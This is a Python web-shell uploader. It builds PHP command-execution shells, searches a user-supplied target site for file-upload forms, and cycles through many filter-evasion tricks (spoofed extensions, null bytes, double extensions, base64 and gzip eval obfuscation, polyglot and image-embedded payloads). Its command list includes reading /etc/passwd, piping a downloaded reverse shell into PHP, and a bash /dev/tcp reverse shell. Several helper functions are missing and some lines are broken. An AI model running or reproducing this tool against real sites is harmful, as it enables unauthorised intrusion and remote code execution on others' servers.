import requests
import random
import hashlib
import base64
import zlib
import json
from urllib.parse import urljoin, urlparse, urlencode
from bs4 import BeautifulSoup
import os
import logging

logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
stream_handler = logging.StreamHandler()
stream_handler.setFormatter(formatter)
logger.addHandler(stream_handler)

RANDOM_COMMANDS = [
    "ls -lah",
    "cat /etc/passwd",
    "uname -a",
    "ps aux",
    "netstat -tulpn",
    "wget -O- https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php | php -q",
    "curl -sS http://example.com/shell.php",
    "wget http://example.com/shell.php",
    "bash -i >& /dev/tcp/example.com/1234 0>&1"
]
IMAGE_FILE = 'image.jpg'

def generate_random_shell(newsrst_method, custom_command=None, encryption_key=None):
    if newsrst_method not in ['GET', 'POST', 'HTTP']:
        logger.error("Invalid request method.")
        return False

    if custom_command:
        random_command = custom_command
    else:
        random_command = random.choice(RANDOM_COMMANDS)

    if newsrst_method == 'GET':
        shell_code = f"""<?php\nif (isset($_GET['cmd'])) {{\n    $cmd = $_GET['cmd'];\n    $output = shell_exec($cmd);\n    echo "<pre>$output</pre>";\n}}"""
    elif newsrst_method == 'POST':
        shell_code = f"""<?php\nif (isset($_POST['command'])) {{\n    $command = $_POST['command'];\n    $output = shell_exec($command);\n    echo "<pre>$output</pre>";\n}}"""
    elif newsrst_method == 'HTTP':
        shell_code = f"""<?php\n$request_body = file_get_contents('php://input');\n$cmd = json_decode($request_body)->cmd;\n$output = shell_exec($cmd);\nif ({encryption_key}) {{\n    $iv = random_bytes(openssl_cipher_iv_length('aes-256-cbc'));\n    $encrypted_output = openssl_encrypt($output, 'aes-256-cbc', hex2bin({encryption_key}), 0, $iv);\n    $output = base64_encode($encrypted_output . '::' . $iv);\n}}\necho json_encode(['output' => $output]);\n?>"""

    shell_code = shell_code.replace('{random_command}', random_command)

    base64_shell_code = base64.b64encode(shell_code.encode('utf-8'))
    compressed_shell_code = zlib.compress(base64_shell_code)
    data_uri_scheme = f'data:image/jpeg;base64,{base64.b64encode(compressed_shell_code).decode("utf-8")}'
    shell_code = shell_code.replace('{shell_code}', data_uri_scheme)

    return shell_code

def random_shell_name():
    return str(random.randint(11111,99999)) + '.php'

def find_upload_point(url):
    try:
        response = requests.get(url)
    except requests.exceptions.RequestException as e:
        logger.error(f"Failed to connect to {url}: {e}")
        return None, None

    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form', {'method': ['post', 'POST']})
    for form in forms:
        input_tag = form.find('input', {'type': 'file'})
        if input_tag:
            return urljoin(url, form['action']), form.get('enctype', 'multipart/form-data')

    content_discovery = ContentDiscovery(url)
    content_discovery.run()
    for link in content_discovery.links:
        if 'upload' in link.lower():
            try:
                response = requests.get(link)
            except requests.exceptions.RequestException as e:
                logger.error(f"Failed to connect to {link}: {e}")
                continue
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form', {'method': ['post', 'POST']})
            for form in forms:
                input_tag = form.find('input', {'type': 'file'})
                if input_tag:
                    return urljoin(url, form['action']), form.get('enctype', 'multipart/form-data')

    return None, None

def upload_file(url, upload_point, enctype, shell_name, shell_content):
    headers = {'Content-Type': enctype}

    spoofed_extensions = ['jpg', 'png', 'gif', 'txt', 'doc', 'pdf']
    for ext in spoofed_extensions:
        files = {'file': (shell_name.rsplit('.', 1)[0] + '.' + ext, shell_content, 'application/octet-stream')}
        files['file'].headers['Content-Disposition'] = f'form-data; name="file"; filename="{shell_name}"'
        try:
            response = requests.post(upload_point, data={'submit': 'Upload'}, files=files, headers=headers)
        except requests.exceptions.RequestException as e:
            logger.error(f"Failed to upload {shell_name}: {e}")
            return None
        if 'success' in response.text.lower():
            return urljoin(url, shell_name)

    null_byte_shell_name = shell_name + '\x00.jpg'
    files = {'file': (null_byte_shell_name, shell_content)}
    try:
        response = requests.post(upload_point, data={'submit': 'Upload'}, files=files, headers=headers)
    except requests.exceptions.RequestException as e:
        logger.error(f"Failed to upload {shell_name}: {e}")
        return None
    if 'success' in response.text.lower():
        return urljoin(url, shell_name)

    double_ext_shell_name = shell_name.rsplit('.', 1)[0] + '.jpg.php'
    files = {'file': (double_ext_shell_name, shell_content)}
    try:
        response = requests.post(upload_point, data={'submit': 'Upload'}, files=files, headers=headers)
    except requests.exceptions.RequestException as e:
        logger.error(f"Failed to upload {shell_name}: {e}")
        return None
    if 'success' in response.text.lower():
        return urljoin(url, double_ext_shell_name)

    large_shell_content = b'A' * 1024 * 1024 + shell_content
    files = {'file': (shell_name, large_shell_content)}
    try:
        response = requests.post(upload_point, data={'submit': 'Upload'}, files=files, headers=headers)
    except requests.exceptions.RequestException as e:
        logger.error(f"Failed to upload {shell_name}: {e}")
        return None
    if 'success' in response.text.lower():
        return urljoin(url, shell_name)

    if not os.path.isfile(IMAGE_FILE):
        logger.error(f"{IMAGE_FILE} not found.")
        return None
    with open(IMAGE_FILE, 'rb') as f:
        image_content = f.read()
    image_shell_content = image_content + shell_content
    files = {'file': (shell_name, image_shell_content)}
    try:
        response = requests.post(upload_point, data={'submit': 'Upload'}, files=files, headers=headers)
    except requests.exceptions.RequestException as e:
        logger.error(f"Failed to upload {shell_name}: {e}")
        return None
    if 'success' in response.text.lower():
        return urljoin(url, shell_name)

    base64_shell_content = base64.b64encode(shell_content)
    obfuscated_shell_content = f"eval(base64_decode('{base64_shell_content.decode('utf-8')}'));"
    files = {'file': (shell_name, obfuscated_shell_content.encode('utf-8'))}
    try:
        response = requests.post(upload_point, data={'submit': 'Upload'}, files=files, headers=headers)
    except requests.exceptions.RequestException as e:
        logger.error(f"Failed to upload {shell_name}: {e}")
        return None
    if 'success' in response.text.lower():
        return urljoin(url, shell_name)

    gzipped_shell_content = zlib.compress(shell_content)
    obfuscated_shell_content = f"eval(gzinflate('{gzipped_shell_content.hex()}'));"
    files = {'file': (shell_name, obfuscated_shell_content.encode('utf-8'))}
    try:
        response = requests.post(upload_point, data={'submit': 'Upload'}, files=files, headers=headers)
    except requests.exceptions.RequestException as e:
        logger.error(f"Failed to upload {shell_name}: {e}")
        return None
    if 'success' in response.text.lower():
        return urljoin(url, shell_name)

    eval_shell_content = f"eval('{shell_content.decode('utf-8')}');"
    files = {'file': (shell_name, eval_shell_content.encode('utf-8'))}
    try:
        response = requests.post(upload_point, data={'submit': 'Upload'}, files=files, headers=headers)
    except requests.exceptions.RequestException as e:
        logger.error(f"Failed to upload {shell_name}: {e}")
        return None
    if 'success' in response.text.lower():
        return urljoin(url, shell_name)

    data_uri_shell_content = f"data:image/jpeg;base64,{base64_shell_content.decode('utf-8')}"
    image_data_uri_content = image_content + data_uri_shell_content.encode('utf-8')
    files = {'file': (shell_name, image_data_uri_content)}
    try:
        response = requests.post(upload_point, data={'submit': 'Upload'}, files=files, headers=headers)
    except requests.exceptions.RequestException as e:
        logger.error(f"Failed to upload {shell_name}: {e}")
        return None
    if 'success' in response.text.lower():
        return urljoin(url, shell_name)

    custom_ext = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=3))
    custom_shell_name = shell_name.rsplit('.', 1)[0] + '.' + custom_ext
    files = {'file': (custom_shell_name, shell_content)}
    try:
        response = requests.post(upload_point, data={'submit': 'Upload'}, files=files, headers=headers)
    except requests.exceptions.RequestException as e:
        logger.error(f"Failed to upload {shell_name}: {e}")
        return None
    if 'success' in response.text.lower():
        return urljoin(url, custom_shell_name)

    polyglot_content = create_polyglot_file(shell_content)
    files = {'file': (shell_name, polyglot_content)}
    try:
        response = requests.post(upload_point, data={'submit': 'Upload'}, files=files, headers=headers)
    except requests.exceptions.RequestException as e:
        logger.error(f"Failed to upload {shell_name}: {e}")
        return None
    if 'success' in response.text.lower():
        return urljoin(url, shell_name)

    stego_image = hide_data_in_image(IMAGE_FILE, shell_content)
    files = {'file': (shell_name, stego_image)}
    try:
        response = requests.post(upload_point, data={'submit': 'Upload'}, files=files, headers=headers)
    except requests.exceptions.RequestException as e:
        logger.error(f"Failed to upload {shell_name}: {e}")
        return None
    if 'success' in response.text.lower():
        return urljoin(url, shell_name)

    logger.error(f"Failed to upload {shell_name} using any method.")
    return None

def try_upload_methods(url, shell_name, shell_content):
    upload_point, enctype = find_upload_point(url)
    if upload_point:
        shell_path = upload_file(url, upload_point, enctype, shell_name, shell_content)
        if shell_path:
            logger.info(f"Shell uploaded successfully to {shell_path}")
        else:
            logger.error(f"Failed to upload the shell to {url}")
    else:
        logger.error(f"Failed to find a file upload point on {url}")
    return shell_path

def main():
    url = input('Enter the target URL: ')
    method = input('Enter the request method for the shell (GET, POST, or HTTP): ')
    custom_command = input('Enter a custom command for the shell (optional): ')
    encryption_key = input('Enter an encryption key for the shell communication (optional): ')

    shell_name = random_shell_name()
    shell_content = generate_random_shell(method, custom_command, encryption_key)

    if shell_content:
        shell_path = try_upload_methods(url, shell_name, shell_content.encode('utf-8'))
    else:
        logger.error("Invalid request method.")

if __name__ == '__main__':
    main()
